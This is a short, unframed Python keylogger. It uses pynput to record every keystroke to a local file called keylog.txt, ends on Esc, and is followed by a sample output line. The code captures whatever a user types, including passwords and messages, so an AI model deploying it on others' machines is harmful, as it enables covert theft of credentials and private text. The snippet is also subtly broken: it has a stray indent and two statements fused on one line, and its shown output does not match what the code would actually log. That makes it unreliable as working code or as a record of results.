Python code: 
   
 from pynput import keyboard 
 
# Function to handle key press events 
def on_press(key): 
    with open("keylog.txt", "a") as log_file: 
        try: 
            log_file.write(key.char) 
        except AttributeError: 
            log_file.write(f' {key} ') 
 
# Function to handle key release events 
def on_release(key): 
    if key == keyboard.Key.esc: 
        return False 
# Start the keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release) listener.start()
listener.join()
Output:
H e l l o W o r l d Key.space Key.esc

